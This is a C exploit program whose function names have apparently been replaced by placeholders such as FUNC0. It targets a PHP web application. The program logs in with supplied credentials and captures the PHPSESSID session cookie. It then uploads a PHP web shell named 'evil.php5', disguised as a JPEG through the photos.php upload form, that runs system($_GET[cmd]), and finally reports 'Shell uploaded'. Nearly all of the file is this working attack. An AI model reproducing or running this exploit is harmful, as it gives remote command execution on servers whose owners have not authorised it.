#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct option {char* member_0; int member_1; int member_3; int /*<<< orphan*/  member_2; } ;

/* Variables and functions */
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (char*) ; 
 int FUNC3 (int,char**,char*,struct option*,int*) ; 
 char* optarg ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 scalar_t__ FUNC5 (int,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC6 (char*,int) ; 
 char* FUNC7 (int,int) ; 
 int FUNC8 (char*) ; 
 char* FUNC9 (char*,char*) ; 
 char* FUNC10 (char*,char*) ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 
 int FUNC12 (char**,char*,char*,char*,...) ; 

int FUNC13(int argc, char *argv[]) {
	
	int sd,
	    option,
	    optidx,
	    port = 80,
	    clen,
	    pkglen;
	char *buffer  = NULL,
		 *rec     = NULL,
		 *session = NULL,
		 *host    = NULL,
		 *path    = NULL,
		 *user    = NULL,
		 *passwd  = NULL,
		 code[] = "--AaB03x\r\n"
				  "Content-Disposition: form-data; name=\"photo\"; filename=\"evil.php5\"\r\n"
				  "Content-Type: image/jpeg\r\n"
			      "\r\n"
				  "<?php echo \"<pre>\"; system($_GET[cmd]); echo \"</pre>\"?>\r\n"
				  "--AaB03x\r\n"
				  
				  "Content-Disposition: form-data; name=\"Call\"\r\n"
				  "\r\n"
				  "add\r\n"
				  "--AaB03x\r\n"
				  
				  "Content-Disposition: form-data; name=\"photoType\"\r\n"
				  "\r\n"
				  "P\r\n"
				  "--AaB03x\r\n"
				  
				  "Content-Disposition: form-data; name=\"image.x\"\r\n"
				  "\r\n"
				  "8\r\n"
				  "--AaB03x\r\n"
				  
				  "Content-Disposition: form-data; name=\"image.y\"\r\n"
				  "\r\n"
				  "5\r\n"
				  "--AaB03x--\r\n";
		
	struct option long_options[] = {
		{"host",         1, 0,  1 },
        {"port",         1, 0,  2 },
		{"path",         1, 0,  3 },
        {"username",     1, 0, 'u'},
        {"password",     1, 0, 'p'},
        {NULL,           0, 0,  0 },
	};
		
	if(argc < 2) {
		FUNC11(argv[0]);
		return -1;
	}
	
	while((option = FUNC3(argc, argv, "u:p:", long_options, &optidx)) > 0) {

		switch(option) {
			
			case 1:
				host = optarg;
			break;
			
			case 2:
				port = FUNC0(optarg);
			break;
			
			case 3:
				path = optarg;
			break;
			
			case 'u':
				user = optarg;
			break;
			
			case 'p':
				passwd = optarg;
			break;
			
			default:
				FUNC11(argv[0]);
				return -1;
			break;
			
		}
		
	}
	
	if(!host || !path || !user || !passwd || port < 0) {
		FUNC11(argv[0]);
		return -1;
	}
					
	FUNC4("\n[*] Connecting...\n");
	
	if((sd = FUNC6(host, port)) < 0) {
		FUNC4("[-] Connection failed!\n\n");
		FUNC2(buffer);
		return -1;
	}
	
	FUNC4("[+] Connected"
	       "\n[*] Login...");
	
	clen = FUNC8(user)+FUNC8(passwd)+16;
	
	pkglen = FUNC12(&buffer, "POST %scheck_login.php HTTP/1.1\r\n"
	                       "Host: %s\r\n"
	                       "Content-Type: application/x-www-form-urlencoded\r\n"
	                       "Content-Length: %d\r\n"
	                       "\r\n"
	                       "email=%s&password=%s", path, host, clen, user, passwd);
	
	if(FUNC5(sd, buffer, pkglen, 0) < 0) {
		FUNC4("[-] Sending failed!\n\n");
		FUNC2(buffer);
		FUNC1(sd);
		return -1;
	}
	
	if(!(rec = FUNC7(sd, 0))) {
		FUNC4("[-] Receive failed!\n\n");
		FUNC2(buffer);
		FUNC1(sd);
		return -1;
	}
	
	if(FUNC9(rec, "Password is invalid")) {
		FUNC4("\n[-] Login Incorrect!\n\n");
		FUNC2(buffer);
		FUNC1(sd);
		return -1;
	}
	
	session = FUNC9(rec, "PHPSESSID");
	
	if(!session) {
		FUNC4("\n[-] Session error!\n\n");
		FUNC2(buffer);
		FUNC1(sd);
		return -1;
	}
	
	session = FUNC10(session, ";");
	
	if(!session) {
		FUNC4("\n[-] Session error!\n\n");
		FUNC2(buffer);
		FUNC1(sd);
		return -1;
	}

	FUNC4("\n[+] Login Successful"
			"\n[*] Uploading...\n");
	
	FUNC1(sd);
	if((sd = FUNC6(host, port)) < 0) {
		FUNC4("[-] Connection failed!\n\n");
		FUNC2(buffer);
		return -1;
	}
			
	FUNC2(buffer);
	clen = FUNC8(code);
	
	pkglen = FUNC12(&buffer, "POST %spopups/photos.php HTTP/1.1\r\n"
					       "Host: %s\r\n"
					       "Cookie: %s\r\n"
					       "Content-type: multipart/form-data, boundary=AaB03x\r\n"
					       "Content-Length: %d\r\n"
					       "\r\n"
					       "%s", path, host, session, clen, code);
	
	if(FUNC5(sd, buffer, pkglen, 0) < 0) {
		FUNC4("[-] Sending failed!\n\n");
		FUNC2(buffer);
		FUNC1(sd);
		return -1;
	}
	
	if(!(rec = FUNC7(sd, 3))) {
		FUNC4("[-] Receive failed!\n\n");
		FUNC2(buffer);
		FUNC1(sd);
		return -1;
	}
	
	if(!FUNC9(rec, "evil.php5")) {
		FUNC4("\n[-] Upload failed!\n\n");
		FUNC2(buffer);
		FUNC1(sd);
		return -1;
	}
	
	FUNC2(buffer);
	FUNC1(sd);
	
	FUNC4("[+] Shell uploaded"
			"\n[+] Connection closed\n\n");
	
	return 0;
	
}